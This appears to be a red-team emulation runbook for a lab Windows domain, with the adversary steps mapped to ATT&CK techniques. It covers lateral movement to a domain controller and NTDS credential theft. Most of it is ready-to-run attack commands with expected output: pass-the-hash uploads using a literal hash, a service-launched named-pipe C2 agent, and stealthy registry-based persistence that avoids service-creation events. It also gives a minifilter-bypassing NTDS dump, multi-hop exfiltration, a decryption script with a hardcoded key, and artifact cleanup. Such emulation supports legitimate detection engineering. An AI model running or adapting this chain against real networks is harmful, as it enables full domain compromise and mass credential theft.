# Phase 4 — Lateral Movement to DC, SMB Pipe C2 Persistence, and NTDS Credential Dump

<!-- CTI references used in this phase. Number them here; cite with [N] in the Reference Tables below. -->

---

## Step 0 — Setup

### Procedures

- Verify Phase 3 completion — Domain Admin NTLM hash extracted from LSASS dump
- Verify TONESHELL C2 session active on WS01 (10.12.10.30) as `TESTLAB\labuser`
- Verify xp_cmdshell + MSSQL channel operational to IIS01 (10.12.10.20)
- Record Domain Admin credentials from Phase 3 output:

  | Account | NT Hash |
  |---|---|
  | `TESTLAB\Administrator` | `<hash from Phase 3 Step 4>` |

- Build `smbpipe-agent.exe` if not already built — see [`resources/payloads/lateral-movement/smbpipe-agent/README.md`](../resources/payloads/lateral-movement/smbpipe-agent/README.md)
- Build `PolicySyncSvc.exe` if not already built — see [`resources/payloads/cred-access/NtdsRawDump/README.md`](../resources/payloads/cred-access/NtdsRawDump/README.md)
- Build `NtServiceInstaller.exe` if not already built — see [`resources/payloads/persistence/windows-service/syscalls-cpp/`](../resources/payloads/persistence/windows-service/syscalls-cpp/)
- Stage all four tool binaries to the controlServer `toneshell` payloads subdirectory (required by `xpstage`):

  ```bash
  cp resources/payloads/lateral-movement/go-thehash/go-thehash.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/go-thehash.exe
  cp resources/payloads/lateral-movement/smbpipe-agent/smbpipe-agent.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/smbpipe-agent.exe
  cp resources/payloads/cred-access/NtdsRawDump/PolicySyncSvc.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/PolicySyncSvc.exe
  cp resources/payloads/persistence/windows-service/syscalls-cpp/NtServiceInstaller.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/NtServiceInstaller.exe
  ```

- Verify DC01 is reachable from IIS01 on TCP 445:

  ```
  xpshell cmd powershell -c "Test-NetConnection -ComputerName DC01 -Port 445 -InformationLevel Quiet"
  ```

---

## Step 1 — Staging: Transfer Tools to IIS01 via MSSQL DB Channel

### Voice Track

With the Domain Administrator's NTLM hash in hand from the Phase 3 LSASS dump, the adversary prepares for lateral movement to the domain controller. Four tools are staged to IIS01 through the established covert database channel: `go-thehash.exe` — a Pass-the-Hash SMB toolkit that authenticates via NTLMv2 using raw NT hashes — `smbpipe-agent.exe` — a lightweight named-pipe C2 agent designed to run as a Windows service on the target DC — `PolicySyncSvc.exe` — a credential-dump tool that harvests `ntds.dit`, `SYSTEM`, `SAM`, and `SECURITY` via raw NTFS cluster reads from a VSS shadow copy — and `NtServiceInstaller.exe` — a persistence tool that registers a Windows service directly through native NT registry APIs. All four binaries are transferred using the same xpstage mechanism proven in Phases 2 and 3: AES-256-CBC encryption on the controlServer, base64 chunking into tempdb via sqlcmd, and in-memory decryption on IIS01 via a PowerShell script staged through the sp_OA file-write channel.

### Procedures

1. ☣️ Stage `go-thehash.exe` to IIS01 via the DB channel:

   ```
   xpstage go-thehash.exe
   ```

   - ***Expected Output***
     ```text
     [+] xpstage done → C:\ProgramData\go-thehash.exe
     ```

2. ☣️ Stage `smbpipe-agent.exe` to IIS01 via the DB channel:

   ```
   xpstage smbpipe-agent.exe
   ```

   - ***Expected Output***
     ```text
     [+] xpstage done → C:\ProgramData\smbpipe-agent.exe
     ```

3. ☣️ Stage `PolicySyncSvc.exe` to IIS01 via the DB channel:

   ```
   xpstage PolicySyncSvc.exe
   ```

   - ***Expected Output***
     ```text
     [+] xpstage done → C:\ProgramData\PolicySyncSvc.exe
     ```

4. ☣️ Stage `NtServiceInstaller.exe` to IIS01 via the DB channel:

   ```
   xpstage NtServiceInstaller.exe
   ```

   - ***Expected Output***
     ```text
     [+] xpstage done → C:\ProgramData\NtServiceInstaller.exe
     ```

5. Verify all four binaries landed on IIS01:

   ```
   xpshell cmd dir C:\ProgramData\go-thehash.exe C:\ProgramData\smbpipe-agent.exe C:\ProgramData\PolicySyncSvc.exe C:\ProgramData\NtServiceInstaller.exe
   ```

### Reference Tables

<!-- xpstage mechanism behaviors (TONESHELL FILE_DOWNLOAD → sqlcmd INSERT → sp_OA write → xp_cmdshell psh → cleanup) are identical to Phase 2 Step 3 and are not re-scored here. Four xpstage cycles — go-thehash.exe, smbpipe-agent.exe, PolicySyncSvc.exe, NtServiceInstaller.exe. -->

---

## Step 2 — Lateral Movement: Pass-the-Hash Tool Upload to DC01 via SMB Admin Share

### Voice Track

The adversary executes `go-thehash.exe` through the xp_cmdshell channel on IIS01 to move laterally to DC01. The tool authenticates to DC01 via NTLMv2 Pass-the-Hash using only the raw Domain Administrator NT hash extracted in Phase 3 — no plaintext password, no Windows SSPI, no Kerberos. It connects to the ADMIN$ administrative share (mapping to `C:\Windows\` on DC01) over SMB2 TCP 445 and uploads three tool binaries — `smbpipe-agent.exe`, `PolicySyncSvc.exe`, and `NtServiceInstaller.exe` — to `C:\Windows\Temp\`. Each is a single go-thehash `put` operation — one authenticated SMB session carrying the file transfer. The MSSQL service account on IIS01 requires no special privilege for this step; the Domain Administrator hash provides full authorization at the SMB protocol level.

### Procedures

1. ☣️ Upload `smbpipe-agent.exe` to DC01 via Pass-the-Hash:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe put DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a ADMIN$ Temp\smbpipe-agent.exe C:\ProgramData\smbpipe-agent.exe
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [+] Uploaded XXXX bytes → \\ADMIN$\ADMIN$\Temp\smbpipe-agent.exe
     ```

2. ☣️ Upload `PolicySyncSvc.exe` to DC01 via Pass-the-Hash:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe put DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a ADMIN$ Temp\PolicySyncSvc.exe C:\ProgramData\PolicySyncSvc.exe
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [+] Uploaded XXXX bytes → \\ADMIN$\ADMIN$\Temp\PolicySyncSvc.exe
     ```

3. ☣️ Upload `NtServiceInstaller.exe` to DC01 via Pass-the-Hash:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe put DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a ADMIN$ Temp\NtServiceInstaller.exe C:\ProgramData\NtServiceInstaller.exe
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [+] Uploaded XXXX bytes → \\ADMIN$\ADMIN$\Temp\NtServiceInstaller.exe
     ```

4. Verify all three binaries landed on DC01:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe ls DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a ADMIN$ Temp smbpipe-agent.exe PolicySyncSvc.exe NtServiceInstaller.exe
   ```

### Reference Tables

<!-- EfsPotato SYSTEM-token capture + CreateProcessWithTokenW spawn of go-thehash.exe is identical to Phase 2 Step 3B (T1134.001 / T1134.002) and is not re-scored here. Every xpshell cmd invocation of go-thehash.exe in this phase runs through that same primitive. -->

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| go-thehash.exe NTLMv2 Pass-the-Hash authentication to DC01 SMB2 TCP 445 | Credential Access | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Windows | TBD | TBD | TBD | `go-thehash.exe` on IIS01 (run via xp_cmdshell as `NT SERVICE\MSSQL$SQLEXPRESS`) authenticates to DC01 via NTLMv2 using Domain Admin NT hash over SMB2 TCP 445 — Logon Type 3 with no corresponding interactive logon session for this hash | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | — |
| go-thehash.exe SMB2 ADMIN$ TreeConnect to DC01 remote service access | Lateral Movement | T1021.002 | Remote Services: SMB/Windows Admin Shares | Windows | TBD | TBD | TBD | `go-thehash.exe` on IIS01 connects to `\\DC01\ADMIN$` via SMB2 TreeConnect using Domain Admin NT hash — administrative share remote service access from a server-role host | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | — |
| go-thehash.exe SMB2 ADMIN$ writes smbpipe-agent.exe, PolicySyncSvc.exe, and NtServiceInstaller.exe to C:\Windows\Temp\ on DC01 | Lateral Movement | T1570 | Lateral Tool Transfer | Windows | TBD | TBD | TBD | `go-thehash.exe` on IIS01 writes `smbpipe-agent.exe`, `PolicySyncSvc.exe`, and `NtServiceInstaller.exe` to `C:\Windows\Temp\` on DC01 via the ADMIN$ administrative share — PE binary tool transfer to DC01 system directory | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/), [smbpipe-agent](../resources/payloads/lateral-movement/smbpipe-agent/), [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/), [NtServiceInstaller](../resources/payloads/persistence/windows-service/syscalls-cpp/) | — |

---

## Step 3 — Execution: Start Pipe Agent and Establish SMB Pipe C2 Channel

### Voice Track

With the agent binary staged on DC01, the adversary uses `go-thehash.exe exec` to create a transient Windows service on DC01 via MS-SCMR over SMB. The tool Pass-the-Hash authenticates to DC01, opens the `svcctl` named pipe on `IPC$`, and issues `CreateServiceW` to register a demand-start service with a random 12-character name pointing to `C:\Windows\Temp\smbpipe-agent.exe`. The Service Control Manager starts the service, spawning the agent as LocalSystem. The transient service is deleted immediately after start — the agent binary continues running. On launch, `smbpipe-agent.exe` creates a named pipe at `\\.\pipe\oraclexa` (mimicking an Oracle XA transaction service endpoint) and enters a loop waiting for client connections. The adversary verifies the C2 channel by running a `whoami` command through the pipe: `go-thehash.exe pipe` authenticates to DC01 via PtH, connects to `IPC$`, opens `\\DC01\pipe\oraclexa`, writes the command, and reads the output — all within a single SMB session. The agent receives the command via the pipe, spawns `cmd.exe` to execute it, and writes the output back. From the network perspective, this is standard IPC$ traffic on TCP 445 — indistinguishable from legitimate Windows named-pipe activity without inspecting the pipe name.

### Procedures

**A — Start agent via transient Windows service**

1. ☣️ Execute the agent on DC01 via MS-SCMR transient service:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe exec DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a "C:\Windows\Temp\smbpipe-agent.exe"
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [*] Service 'abcxyzqwerty' created, starting...
     [!] Service start timed out (expected — command was dispatched)
     [+] Service 'abcxyzqwerty' deleted
     ```

   > Timeout is expected — `smbpipe-agent.exe` does not call `SetServiceStatus` when launched via transient service; SCM kills the service entry but the process continues running.

**B — Verify SMB Pipe C2 channel**

2. ☣️ Send test command through the pipe C2:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "whoami"
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     nt authority\system
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| go-thehash.exe MS-SCMR transient service execution spawning smbpipe-agent.exe as LocalSystem on DC01 | Execution | T1569.002 | System Services: Service Execution | Windows | TBD | TBD | TBD | `go-thehash.exe` on IIS01 PtH authenticates to DC01, opens `svcctl` pipe on `IPC$`, binds MS-SCMR, and calls `CreateServiceW` (random 12-char name, `SERVICE_WIN32_OWN_PROCESS`, `SERVICE_DEMAND_START`, BinaryPathName=`C:\Windows\Temp\smbpipe-agent.exe`); SCM starts the service — `services.exe` spawns `smbpipe-agent.exe` as `NT AUTHORITY\SYSTEM`; transient service then removed via `DeleteService` while the process keeps running | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator / NT AUTHORITY\SYSTEM | [go-thehash](../resources/payloads/lateral-movement/go-thehash/), [smbpipe-agent](../resources/payloads/lateral-movement/smbpipe-agent/) | — |
| smbpipe-agent.exe creates named pipe \\.\pipe\oraclexa masquerading as Oracle XA service endpoint | Stealth | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | TBD | TBD | TBD | `smbpipe-agent.exe` (running as `NT AUTHORITY\SYSTEM` from `C:\Windows\Temp\`) creates named pipe `\\.\pipe\oraclexa` and enters accept loop — pipe name mimics Oracle XA transaction service | DC01 (TBD) | NT AUTHORITY\SYSTEM | [smbpipe-agent](../resources/payloads/lateral-movement/smbpipe-agent/) | — |
| go-thehash.exe SMB2 named pipe command write and output read over \\DC01\pipe\oraclexa | Command and Control | T1071 | Application Layer Protocol | Windows | TBD | TBD | TBD | `go-thehash.exe` on IIS01 PtH authenticates to DC01, TreeConnects `IPC$`, opens `\\DC01\pipe\oraclexa` via SMB2 Create, writes command bytes via SMB2 Write and reads output via SMB2 Read — request-response C2 exchange over SMB named pipe | IIS01 (10.12.10.20) / DC01 (TBD) | TESTLAB\Administrator | [go-thehash](../resources/payloads/lateral-movement/go-thehash/) | — |

---

## Step 4 — Persistence: Registry-Backed Windows Service on DC01

### Voice Track

With the pipe C2 channel verified, the adversary establishes persistence on DC01 by registering the pipe agent as a permanent Windows service — but without calling `CreateServiceW`. A command sent through the pipe executes `NtServiceInstaller.exe`, which opens `\Registry\Machine\SYSTEM\CurrentControlSet\Services`, creates a service subkey, and writes the service configuration using native NT registry APIs (`NtOpenKey`, `NtCreateKey`, `NtSetValueKey`) — bypassing the Service Control Manager entirely. The service is registered as `OracleXAService` with display name `Oracle XA Transaction Service` — a name chosen to blend with legitimate Oracle database middleware — and `ImagePath` pointing to `C:\Windows\Temp\smbpipe-agent.exe`, `Start = 2` (AutoStart), `ObjectName = LocalSystem`. Because SCM never receives a `CreateServiceW` request, no System Event ID 7045 is generated; the only artifact is the service registry key itself, and the service does not appear in SCM until reboot or a manual service-database refresh.

### Procedures

1. ☣️ Install the pipe agent as a registry-backed Windows service via NT native APIs:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "C:\Windows\Temp\NtServiceInstaller.exe install C:\Windows\Temp\smbpipe-agent.exe OracleXAService \"Oracle XA Transaction Service\" \"Oracle XA transaction service endpoint\""
   ```

   - ***Expected Output***
     ```text
     Service key created (disposition: <n>)
     Service 'OracleXAService' installed successfully via NT syscalls
     Note: Service requires system reboot or manual SCM refresh to appear
     ```

2. Verify the service registry configuration:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "reg query HKLM\SYSTEM\CurrentControlSet\Services\OracleXAService /v ImagePath & reg query HKLM\SYSTEM\CurrentControlSet\Services\OracleXAService /v Start"
   ```

   - ***Expected Output***
     ```text
     ImagePath    REG_SZ    C:\Windows\Temp\smbpipe-agent.exe
     Start        REG_DWORD 0x2
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| NtServiceInstaller.exe NT native registry-backed service creation of OracleXAService on DC01 | Persistence | T1543.003 | Create or Modify System Process: Windows Service | Windows | TBD | TBD | TBD | `NtServiceInstaller.exe` (spawned by `smbpipe-agent.exe` as `NT AUTHORITY\SYSTEM`) writes the service configuration directly to `HKLM\SYSTEM\CurrentControlSet\Services\OracleXAService` via `NtCreateKey` + `NtSetValueKey` — `Type=16`, `Start=2`, `ImagePath=C:\Windows\Temp\smbpipe-agent.exe`, `ObjectName=LocalSystem`; no `CreateServiceW` call, no System Event ID 7045 | DC01 (TBD) | NT AUTHORITY\SYSTEM | [NtServiceInstaller](../resources/payloads/persistence/windows-service/syscalls-cpp/) | — |
| NtServiceInstaller.exe NtCreateKey NtSetValueKey NT native registry API service write | Execution | T1106 | Native API | Windows | TBD | TBD | TBD | `NtServiceInstaller.exe` (spawned by `smbpipe-agent.exe` as `NT AUTHORITY\SYSTEM`) resolves `NtOpenKey`, `NtCreateKey`, `NtSetValueKey`, and `NtClose` from ntdll.dll at runtime and writes the service key via NT native registry APIs — bypassing advapi32.dll registry function hooks | DC01 (TBD) | NT AUTHORITY\SYSTEM | [NtServiceInstaller](../resources/payloads/persistence/windows-service/syscalls-cpp/) | — |
| NtServiceInstaller.exe NT native registry value write to OracleXAService service key | Persistence | T1112 | Modify Registry | Windows | TBD | TBD | TBD | `NtServiceInstaller.exe` writes registry values `Type`, `Start`, `ErrorControl`, `ImagePath`, `DisplayName`, `ObjectName` under `HKLM\SYSTEM\CurrentControlSet\Services\OracleXAService` via `NtSetValueKey` — registry modification is the mechanism used to create the persistent service | DC01 (TBD) | NT AUTHORITY\SYSTEM | [NtServiceInstaller](../resources/payloads/persistence/windows-service/syscalls-cpp/) | — |

---

## Step 5 — Credential Access: NTDS Raw Dump via NtdsRawDump on DC01

### Voice Track

With persistent access to DC01 established, the adversary targets the Active Directory database. Through the pipe C2 channel, the agent executes `PolicySyncSvc.exe` — a single tool invocation that performs the full credential harvest chain. The tool creates a Volume Shadow Copy of `C:` via WMI `Win32_ShadowCopy.Create()` — no `vssadmin.exe` process is spawned. For each target file (`ntds.dit`, `SYSTEM`, `SAM`, `SECURITY`), it opens the shadow path solely to obtain the NTFS cluster map via `FSCTL_GET_RETRIEVAL_POINTERS`, then reads the raw cluster bytes by issuing `ReadFile` against the shadow volume device handle — a storage-layer I/O path that bypasses the filesystem minifilter. Each file is AES-256-CBC-encrypted in-memory and written to `C:\ProgramData\CertStore\` as opaque `.tmp` blobs. The tool then builds a ZIP archive entirely in-memory, AES-encrypts it, base64-encodes it, and writes it as `certstore.cmd` wrapped in a valid batch-script stub. With `--cleanup`, the shadow copy and `CertStore\` staging directory are deleted before the final container is written — leaving only `C:\ProgramData\certstore.cmd` on DC01 disk.

### Procedures

1. ☣️ Execute the credential dump tool on DC01 via the pipe C2 channel:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "C:\Windows\Temp\PolicySyncSvc.exe C:\ProgramData\CertStore --cleanup"
   ```

   - ***Expected Output***
     ```text
     [*] Initializing store consistency snapshot...
     [+] Snapshot acquired.
     [*] Cluster alignment: 4096 bytes
     [*] Processing trust anchor database... <N> bytes
     [*] Processing machine configuration store... <N> bytes
     [*] Processing account authority store... <N> bytes
     [*] Processing extended trust policy store... <N> bytes
     [+] Completed. 4/4 stores processed.
     [*] Compressing store bundle...
     [*] Cleaning up intermediates...
     [+] Cleanup done.
     [+] Bundle written: C:\ProgramData\certstore.cmd (<N> bytes)
     ```

   > `--cleanup` deletes the VSS shadow copy and `C:\ProgramData\CertStore\` before writing `certstore.cmd` — only the final encrypted container remains on DC01 disk.

2. Verify the output container exists:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "dir C:\ProgramData\certstore.cmd"
   ```

   - ***Expected Output***
     ```text
     ...  certstore.cmd
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| PolicySyncSvc.exe FILE_FLAG_BACKUP_SEMANTICS open NTDS.dit on VSS shadow path | Credential Access | T1003.003 | OS Credential Dumping: NTDS | Windows | TBD | TBD | TBD | `PolicySyncSvc.exe` (spawned by `smbpipe-agent.exe` as `NT AUTHORITY\SYSTEM`) opens `ntds.dit` under the VSS shadow path with `FILE_FLAG_BACKUP_SEMANTICS` to retrieve its NTFS cluster map via `FSCTL_GET_RETRIEVAL_POINTERS` — NTDS namespace access is the credential-targeting signal; actual data read via raw volume device handle (T1006) | DC01 (TBD) | NT AUTHORITY\SYSTEM | [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/) | — |
| PolicySyncSvc.exe Win32_ShadowCopy.Create WMI volume shadow copy creation | Execution | T1047 | Windows Management Instrumentation | Windows | TBD | TBD | TBD | `PolicySyncSvc.exe` creates and deletes a VSS shadow copy via WMI `Win32_ShadowCopy.Create()`/`.Delete()` — non-backup process creates volume shadow copy through programmatic COM instead of `vssadmin.exe` | DC01 (TBD) | NT AUTHORITY\SYSTEM | [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/) | — |
| PolicySyncSvc.exe raw ReadFile volume device handle VSS shadow cluster read | Stealth | T1006 | Direct Volume Access | Windows | TBD | TBD | TBD | `PolicySyncSvc.exe` opens the shadow volume device (`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN`) and reads NTFS cluster data for `ntds.dit`, `SYSTEM`, `SAM`, `SECURITY` via raw `ReadFile` at LCN byte offsets — reads bypass the WdFilter.sys filesystem minifilter | DC01 (TBD) | NT AUTHORITY\SYSTEM | [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/) | — |
| PolicySyncSvc.exe System.IO.Compression ZipArchive MemoryStream in-process ZIP assembly | Collection | T1560.002 | Archive Collected Data: Archive via Library | Windows | TBD | TBD | TBD | `ZipArchive` over `MemoryStream` compresses the four encrypted credential `.tmp` files entirely in-process — no child archival process spawned, no intermediate ZIP file on disk | DC01 (TBD) | NT AUTHORITY\SYSTEM | [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/) | — |
| PolicySyncSvc.exe AES-256-CBC custom archive batch wrapper certstore.cmd write | Collection | T1560.003 | Archive Collected Data: Archive via Custom Method | Windows | TBD | TBD | TBD | `PolicySyncSvc.exe` applies AES-256-CBC (`AesCryptoServiceProvider`) per-file and over the in-memory ZIP, base64-encodes the result, and wraps it in a `@echo off` batch stub writing `certstore.cmd` to `C:\ProgramData\` — custom archive format combining AES encryption, base64, and batch-file camouflage | DC01 (TBD) | NT AUTHORITY\SYSTEM | [NtdsRawDump](../resources/payloads/cred-access/NtdsRawDump/) | — |

---

## Step 6 — Collection and Exfiltration: Transfer NTDS Container to Attacker

### Voice Track

With `certstore.cmd` staged on DC01, the adversary transfers the encrypted credential container back to the attacker machine through the established multi-hop channel. From IIS01, `go-thehash.exe` authenticates to DC01 via Pass-the-Hash and downloads `certstore.cmd` from the `C$` administrative share over SMB2. The container lands on IIS01 at `C:\ProgramData\`, then `xpexfil` transfers it to the controlServer via the same chunked MSSQL/TONESHELL channel used for the LSASS dump in Phase 3. On the attacker machine, the batch-wrapper is base64-decoded and AES-256-CBC-decrypted to recover the in-memory ZIP, which yields the four AES-encrypted credential blobs; a second decryption pass restores `ntds.dit`, `SYSTEM.hiv`, `SAM.hiv`, and `SECURITY.hiv`, and `impacket-secretsdump` extracts every domain account's NTLM hash offline.

### Procedures

**A — Download from DC01 to IIS01 via SMB admin share**

1. ☣️ Download `certstore.cmd` from DC01:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe get DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a C$ ProgramData\certstore.cmd C:\ProgramData\certstore.cmd
   ```

   - ***Expected Output***
     ```text
     [+] Authenticated as TESTLAB\Administrator
     [+] Downloaded XXXXXXXX bytes → C:\ProgramData\certstore.cmd
     ```

**B — Exfil from IIS01 to controlServer**

2. ☣️ Exfil `certstore.cmd` via chunked MSSQL/TONESHELL channel:

   ```
   xpexfil "C:\ProgramData\certstore.cmd" certstore.cmd 600 8
   ```

**C — Offline decrypt and credential extraction (attacker machine)**

3. ☣️ Decrypt `certstore.cmd` and extract the archive on the attacker machine:

   ```python
   from Crypto.Cipher import AES
   import os, zipfile, base64

   KEY = bytes.fromhex('e4e5dd75c6b3d216f0917a6629f33df2104d280381f857d9ed1f3296a77a9478')

   def aes_decrypt(data):
       iv, ct = data[:16], data[16:]
       pt = AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct)
       return pt[:-pt[-1]]  # PKCS7 unpad

   # Step 1 — parse base64 wrapper, decrypt, extract archive
   with open('certstore.cmd', 'r', encoding='ascii') as f:
       for line in f:
           if line.startswith('set _b='):
               enc_data = base64.b64decode(line[7:].strip())
               break
   zip_data = aes_decrypt(enc_data)
   open('certstore.zip', 'wb').write(zip_data)
   with zipfile.ZipFile('certstore.zip') as z:
       z.extractall('certstore/')
   os.remove('certstore.zip')

   # Step 2 — decrypt individual credential files (raw binary format)
   for s, d in [('ntds.tmp','ntds.dit'),('system.tmp','SYSTEM.hiv'),
                ('sam.tmp','SAM.hiv'),('security.tmp','SECURITY.hiv')]:
       p = 'certstore/' + s
       if os.path.exists(p):
           open('certstore/' + d, 'wb').write(aes_decrypt(open(p,'rb').read()))
           print('[+]', s, '->', d)
   ```

   - ***Expected Output***
     ```text
     [+] ntds.tmp -> ntds.dit
     [+] system.tmp -> SYSTEM.hiv
     [+] sam.tmp -> SAM.hiv
     [+] security.tmp -> SECURITY.hiv
     ```

4. ☣️ Run offline credential extraction:

   ```bash
   impacket-secretsdump -ntds certstore/ntds.dit -system certstore/SYSTEM.hiv -sam certstore/SAM.hiv LOCAL
   ```

   - ***Expected Output***
     ```text
     [*] Target system bootKey: 0x<syskey>
     [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
     [*] Searching for pekList, be patient
     [*] PEK # 0 found and decrypted: <pek>
     [*] Reading and decrypting hashes from certstore/ntds.dit
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:<hash>:::
     Guest:501:aad3b435b51404eeaad3b435b51404ee:<hash>:::
     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<hash>:::
     labuser:1103:aad3b435b51404eeaad3b435b51404ee:<hash>:::
     svc_app_dev:1104:aad3b435b51404eeaad3b435b51404ee:<hash>:::
     ...
     ```

### Reference Tables

<!-- Step 6 download (go-thehash PtH SMB2 C$ read of certstore.cmd) reuses the T1550.002 / T1021.002 primitives already scored in Step 2 — not re-scored here. -->

<!-- xpexfil mechanism behaviors (IIS01 AES encrypt + SqlClient INSERT → WS01 decode + write chunk → TONESHELL FILE_UPLOAD → cleanup) are identical to Phase 3 Step 3 and are not re-scored here. -->

<!-- Step 6C (offline decrypt + impacket-secretsdump) executes on the attacker machine — outside the lab. Off the declared Surface Profile — not scored. -->

---

## Step 7 — Cleanup: Remove Artifacts from DC01 and IIS01

### Voice Track

The adversary removes all staging artifacts and forensic traces created during the DC01 lateral movement and NTDS dump. Through the pipe C2 channel, the agent deletes the `certstore.cmd` container from `C:\ProgramData\` on DC01 — the VSS shadow copy and `CertStore\` staging directory were already removed by `PolicySyncSvc.exe --cleanup` during Step 5. On IIS01, the staged copy of the container is deleted via xp_cmdshell. The pipe agent binary and service registration on DC01 are optionally retained for continued access or removed for full cleanup.

### Procedures

1. ☣️ Delete the credential container from DC01:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "del /f C:\ProgramData\certstore.cmd"
   ```

2. ☣️ Delete exfil staging artifact from IIS01:

   ```
   xpshell cmd del /f C:\ProgramData\certstore.cmd
   ```

3. (Optional) Full cleanup — unregister service and delete tool binaries on DC01:

   ```
   xpshell cmd C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "C:\Windows\Temp\NtServiceInstaller.exe uninstall OracleXAService"
   xpshell cmd C:\ProgramData\go-thehash.exe pipe DC01 TESTLAB Administrator 41c46bf74ec071f65c7b97df4b7d672a oraclexa "del /f C:\Windows\Temp\smbpipe-agent.exe C:\Windows\Temp\PolicySyncSvc.exe C:\Windows\Temp\NtServiceInstaller.exe"
   ```

### Reference Tables

<!-- Step 7 cleanup (file deletion via T1070.004) is redundant with T1070.004 already scored in Phases 1–3 — not re-scored here. -->

---
